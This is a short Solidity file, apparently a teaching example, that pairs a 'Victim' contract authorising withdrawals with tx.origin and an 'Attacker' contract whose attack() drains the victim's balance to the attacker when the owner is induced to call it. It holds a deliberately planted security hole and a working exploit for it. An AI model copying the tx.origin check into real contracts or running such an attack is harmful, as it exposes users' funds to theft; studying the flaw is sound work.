// tx origin means the adress of transaction is originated
// assume a and b are contract and when we call a.funtion from b tx origin will ve owner of a
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;
contract Victim{

    event RevertedWithdraw(address sender, uint amount);

    address private owner;
    uint private balance;

    constructor() payable {
        owner = msg.sender;
        balance = msg.value;
    }
    function withdraw(address _to,uint _amount) external { // just owner can withdraw
        require(tx.origin == owner,"just owner can withdraw");
        balance -= _amount;
        // when we dont use address paramater and sending to directly msg.sender it doesnt work
        (bool success, ) = _to.call{value: _amount}("");
        if(!success){
            emit RevertedWithdraw(msg.sender, _amount);
            revert("reverted");    
        }
    }
    function getBalance() public view returns (uint){
        return balance;
    }
}

contract Attacker{
    Victim v;
    address public owner;
    constructor(address _adrs){
        v = Victim(_adrs);
        owner = msg.sender;
    }
    function attack() public payable {
        v.withdraw(owner, address(v).balance);
    }

    function getBalance() public view returns(uint) {
        return address(owner).balance;
    }
}
